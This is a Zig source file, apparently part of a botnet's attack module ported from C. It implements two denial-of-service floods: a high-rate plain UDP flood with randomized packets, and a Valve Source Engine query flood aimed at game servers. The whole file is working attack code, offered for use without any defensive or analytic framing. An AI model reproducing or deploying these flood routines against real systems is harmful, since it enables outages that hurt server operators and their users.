//! # UDP Attack Methods
//!
//! High-PPS UDP flooding and VSE (Valve Source Engine) floods.
//!
//! ## C Reference: modules/attack/methods/udp.c, vse.c

const std = @import("std");
const posix = std.posix;
const crypto = @import("../crypto/mod.zig");

// ============================================================
// UDP PLAIN FLOOD (from C: udp.c attack_udp_plain lines 17-55)
// ============================================================

pub fn attackUdpPlain(ip: u32, port: u16, duration: u32) void {
    const sock = posix.socket(posix.AF.INET, posix.SOCK.DGRAM, 0) catch return;
    defer posix.close(sock);
    
    var dest: posix.sockaddr.in = .{
        .family = posix.AF.INET,
        .port = std.mem.nativeToBig(u16, port),
        .addr = ip, // Already network byte order
    };
    
    // connect() skips routing lookups per-packet
    posix.connect(sock, @ptrCast(&dest), @sizeOf(posix.sockaddr.in)) catch return;
    
    // Generate random packet
    var packet: [1024]u8 = undefined;
    var rng = crypto.FastRandom.init(@truncate(@as(u64, @bitCast(std.time.timestamp()))));
    rng.fill(&packet);
    
    const end_time = std.time.timestamp() + duration;
    
    while (std.time.timestamp() < end_time) {
        // Partial randomization (first 8 bytes) to change hash
        const r1 = rng.next();
        const r2 = rng.next();
        std.mem.writeInt(u32, packet[0..4], r1, .little);
        std.mem.writeInt(u32, packet[4..8], r2, .little);
        
        _ = posix.send(sock, &packet, 0) catch break;
    }
}

// ============================================================
// VSE FLOOD (from C: vse.c attack_udp_vse)
// ============================================================
// Valve Source Engine query packet

const VSE_PAYLOAD = [_]u8{
    0xFF, 0xFF, 0xFF, 0xFF, // Header
    0x54, // A2S_INFO request
    'S', 'o', 'u', 'r', 'c', 'e', ' ', 'E', 'n', 'g', 'i', 'n', 'e', ' ', 'Q', 'u', 'e', 'r', 'y', 0x00,
};

pub fn attackUdpVse(ip: u32, port: u16, duration: u32) void {
    const sock = posix.socket(posix.AF.INET, posix.SOCK.DGRAM, 0) catch return;
    defer posix.close(sock);
    
    var dest: posix.sockaddr.in = .{
        .family = posix.AF.INET,
        .port = std.mem.nativeToBig(u16, port),
        .addr = ip,
    };
    
    posix.connect(sock, @ptrCast(&dest), @sizeOf(posix.sockaddr.in)) catch return;
    
    const end_time = std.time.timestamp() + duration;
    
    while (std.time.timestamp() < end_time) {
        _ = posix.send(sock, &VSE_PAYLOAD, 0) catch break;
    }
}
